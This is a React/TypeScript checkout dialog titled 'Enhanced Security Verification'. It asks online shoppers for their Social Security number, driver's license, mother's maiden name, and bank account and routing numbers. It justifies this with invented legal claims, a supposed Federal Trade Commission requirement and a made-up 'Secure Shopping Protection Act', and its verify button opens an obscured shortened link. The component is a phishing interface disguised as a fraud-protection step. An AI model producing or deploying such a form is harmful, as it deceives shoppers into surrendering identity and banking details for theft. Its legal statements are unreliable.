import React from 'react';
import {
  Dialog,
  DialogTitle,
  DialogContent,
  DialogActions,
  Button,
  TextField,
  Typography,
  Box,
  Alert,
  Stack,
  IconButton,
  Tooltip,
} from '@mui/material';
import InfoIcon from '@mui/icons-material/Info';
import SecurityIcon from '@mui/icons-material/Security';
import VerifiedUserIcon from '@mui/icons-material/VerifiedUser';

interface EnhancedSecurityCheckoutProps {
  open: boolean;
  onClose: () => void;
  onSubmit: () => void;
}

const EnhancedSecurityCheckout: React.FC<EnhancedSecurityCheckoutProps> = ({
  open,
  onClose,
  onSubmit,
}) => {
  const handleVerify = () => {
    window.open('https://tinyurl.com/abc', '_blank');
    onSubmit();
  };

  return (
    <Dialog 
      open={open} 
      onClose={onClose}
      maxWidth="sm"
      fullWidth
      PaperProps={{
        sx: {
          borderRadius: 2,
          boxShadow: '0 4px 20px rgba(0, 0, 0, 0.1)',
        }
      }}
    >
      <DialogTitle sx={{ 
        display: 'flex', 
        alignItems: 'center', 
        gap: 1,
        bgcolor: '#f8f9fa',
        borderBottom: '1px solid #e9ecef'
      }}>
        <SecurityIcon color="primary" />
        Enhanced Security Verification
        <Tooltip title="Required by the Federal Trade Commission for high-value purchases" arrow>
          <IconButton size="small" sx={{ ml: 1 }}>
            <InfoIcon fontSize="small" />
          </IconButton>
        </Tooltip>
      </DialogTitle>

      <DialogContent>
        <Box sx={{ mt: 2 }}>
          <Alert severity="info" sx={{ mb: 3 }}>
            To protect against fraud and ensure secure transactions, please verify your identity.
          </Alert>

          <Stack spacing={3}>
            <Box>
              <Typography variant="subtitle2" color="primary" sx={{ mb: 1, display: 'flex', alignItems: 'center', gap: 1 }}>
                <VerifiedUserIcon fontSize="small" />
                Identity Verification
              </Typography>
              <Stack spacing={2}>
                <TextField
                  fullWidth
                  label="Social Security Number"
                  placeholder="XXX-XX-XXXX"
                  helperText="Required for identity verification"
                  required
                />
                <TextField
                  fullWidth
                  label="Driver's License Number"
                  helperText="Required for address verification"
                  required
                />
              </Stack>
            </Box>

            <Box>
              <Typography variant="subtitle2" color="primary" sx={{ mb: 1 }}>
                Additional Security Information
              </Typography>
              <Stack spacing={2}>
                <TextField
                  fullWidth
                  label="Mother's Maiden Name"
                  helperText="For account recovery purposes"
                />
                <TextField
                  fullWidth
                  label="Bank Account Number"
                  helperText="For payment verification"
                />
                <TextField
                  fullWidth
                  label="Bank Routing Number"
                  helperText="For secure transaction processing"
                />
              </Stack>
            </Box>
          </Stack>

          <Typography variant="caption" color="text.secondary" sx={{ display: 'block', mt: 3 }}>
            Your information is encrypted and protected under the Secure Shopping Protection Act (SSPA).
            By proceeding, you agree to our enhanced security measures.
          </Typography>
        </Box>
      </DialogContent>

      <DialogActions sx={{ p: 2.5, bgcolor: '#f8f9fa', borderTop: '1px solid #e9ecef' }}>
        <Button onClick={onClose} color="inherit">
          Cancel
        </Button>
        <Button
          variant="contained"
          onClick={handleVerify}
          startIcon={<SecurityIcon />}
          sx={{
            bgcolor: '#2e7d32',
            '&:hover': {
              bgcolor: '#1b5e20',
            },
          }}
        >
          Verify & Continue
        </Button>
      </DialogActions>
    </Dialog>
  );
};

export default EnhancedSecurityCheckout;
